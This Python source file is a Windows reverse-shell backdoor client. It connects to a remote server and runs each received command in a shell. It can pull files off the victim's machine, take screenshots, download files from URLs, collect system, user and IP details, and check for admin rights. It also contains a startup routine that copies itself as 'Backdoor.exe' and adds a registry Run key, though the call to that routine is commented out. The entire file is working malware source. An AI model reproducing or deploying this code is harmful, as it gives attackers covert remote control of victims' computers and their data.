import socket
import subprocess
import json
import os
import time
import platform
import base64
import requests
from mss import mss
# import pickle
# import tqdm
import shutil
import sys
import wmi
import getpass
import ifaddr

'''
rsq -> QUIT
rqhelp -> See reverse shell help
get [link] -> download a file (auto file name)
start [filepath] -> open a file
download [filepath] -> download file to server
upload [filepath] -> download file to client
screenshot -> take a screenshot
check -> check for admin privilege  
'''



REMOTE_HOST = '127.0.0.1' # '192.168.43.82'
REMOTE_PORT = 8081 # 2222
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


# CONNECT TO SERVER
# -----------------------------------
def connect_to_server():
    while True:
        time.sleep(1)
        try:
            # print("+ Initiating Connection")
            client.connect((REMOTE_HOST, REMOTE_PORT))
            print("+ Connected to server")
            shell()
        except:
            print(f'- Unable to connect to the server')
            connect_to_server()

# RELIABLE SEND
# -----------------------------------
def send(data):
    # try:
    #     # data = data.encode()
    #     pass
    # except AttributeError:
    #     pass
    json_data = json.dumps(data)
    client.send(json_data.encode())

# RELIABLE RECIEVE
# -----------------------------------
def recv():

    data = b""
    while True:
        try:
            data = data + client.recv(1024000)
            return json.loads(data.decode())
        except ValueError:
            break
        except Exception as e:
            print(e)
            break

# SEND FILE
# -----------------------------------
def send_file(filename):
    # print("starting function")
    json_data = json.dumps(filename.decode())
    # print("parsed json succesfully")
    client.send(json_data.encode())
    # print("sent data")

# RECIEVE FILE
# -----------------------------------
def recv_file():
    # print("starting function")
    data = b""
    # print("starting while true loop")
    while True:
        try:
            # print("adding up data")
            data = data + client.recv(1024000)
            # print("first decode done")
            return json.loads(data.decode())
        except ValueError:
            break
        except Exception as e:
            print(e)
            break

# DOWNLOAD FILES FROM INTERNET
# -----------------------------------
def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

# TAKE SCREEN SHOT
# -----------------------------------
def screenshot():
    with mss() as screenshot:
        screenshot.shot()

# CHECK ADMIN PRIVILIAGES
# -----------------------------------
def is_admin():
    global admin
    try:
        temp = os.listdir(os.sep.join([os.environ('SystemRoot','C;\\Windows'), 'temp']))
    except:
        admin="User Privilaes"
    else:
        admin="Administrator Privilaes"

# SHELL CLIENT
# -----------------------------------
def shell():
    while True:
        command = recv()
        print(f'Command Recieved: {command}')

        if command == "rsq":
            break

        elif command == "rshelp":
            try:
                help_cmd = '''
        rsq -> QUIT
        rqhelp -> See reverse shell help
        get [link] -> download a file (auto file name)
        start [filepath] -> open a file
        download [filepath] -> download file to server
        upload [filepath] -> download file to client
        screenshot -> take a screenshot
        check -> check for admin privilege
        info -> get system info
        rsipconfig -> get IP address information
        rspublicip -> get the public IP address
                '''
                send(help_cmd)
            except:
                pass
        
        elif command[:2] == "cd" and len(command) > 1:
            try:
                os.chdir(command[3:])
            except:
                continue

        elif command[:8] == "download":
            with open(command[9:], "rb") as file:
                filecontent = base64.b64encode(file.read())
                print(filecontent)
                send_file(filecontent)

        elif command[:6] == "upload":
            with open(command[7:], "wb") as fin:
                result = recv_file()
                fin.write(base64.b64decode(result))
        
        elif command[:3] == "get":
            try:
                download(command[4:])
                send("+ Downloaded file from specified URL! ")
            except:
                send("- Failed to download file")
        
        elif command[:5] == "start":
            try:
                subprocess.Popen(command[6:], shell=True)
                send("[!!] Started")
            except:
                send("[!!] Started")
        
        elif command[:10] == "screenshot":
            try:
                screenshot()
                with open("monitor-1.png", "rb") as sc:
                    send_file(base64.b64encode(sc.read()))
                try:
                    os.remove("monitor-1.png")
                    continue
                except:
                    continue
                continue
            except:
                send("[!!] Failed to take a screenshot")
                continue
            continue
        
        elif command[:5] == "check":
            try:
                is_admin()
                send(admin)
            except:
                send("[!!] Cant perform the Check!")
        
        elif command == "info":
            try:
                computer = wmi.WMI()
                os_info = computer.Win32_OperatingSystem()[0]
                proc_info = computer.Win32_Processor()[0]
                gpu_info = computer.Win32_VideoController()[0]
                user = getpass.getuser()

                windows_version = platform.version().split('.')
                os_version = ' '.join([os_info.Version, os_info.BuildNumber])
                system_ram = float(os_info.TotalVisibleMemorySize) / 1048576  # KB to GB
                msg = str('\n[+] Computer information:\n' +
                '\nOS Name: {0}'.format(platform.system() + " " + windows_version[0]) + "\n" +
                              'OS Version: {0}'.format(os_version) + '\n'
                              'CPU: {0}'.format(proc_info.Name) + '\n' +
                              'RAM: {0} GB'.format(system_ram) + '\n' +
                              'Graphics Card: {0}'.format(gpu_info.Name + '\n'+
                              'Username: {0}'.format(user)+'\n'))
                send(msg)
            except:
                msg = "- Could not get computer information"
                send(msg)
        
        elif command == "rsipconfig":
            try:
                adapters = ifaddr.get_adapters()
                msg = ""
                for adapter in adapters:
                    title = str("\n\nNetwork adapter name: '" + adapter.nice_name + "':\n")
                    msg += title
                    for ip in adapter.ips:
                        desc = str("   IP: %s/%s" % (ip.ip, ip.network_prefix))
                        msg += desc
                msg += "\n"
                ip = requests.get('https://api.ipify.org').text
                msg += "\nPublic IP address: " + ip + "\n"
                send(msg)
            except:
                msg = "- Could not get network adapters"
                send(msg)
        
        elif command == "rspublicip":
            try:
                ip = requests.get('https://api.ipify.org').text
                msg = f"+ PUBLIC IP: {ip}\n"
                send(msg)
            except:
                msg = "- Could not get Public IP"
                send(msg)
        
        elif command == "status":
            statusvictim = "+ CONNECTED!"
            send(statusvictim)

        
        else:
            proc = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            # print("[-] Sending response...")
            result = proc.stdout.read() + proc.stderr.read()
            # print(result)
            # print(result.decode())
            send(result.decode())

# RUN AT STARTUP
# -----------------------------------
def run_at_startup():
    location = os.environ["appdata"] + "\\Backdoor.exe"
    if not os.path.exists(location):
        shutil.copyfile(sys.executable, location)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)


try:
    # run_at_startup()
    print("bruh")
except:
    pass
connect_to_server()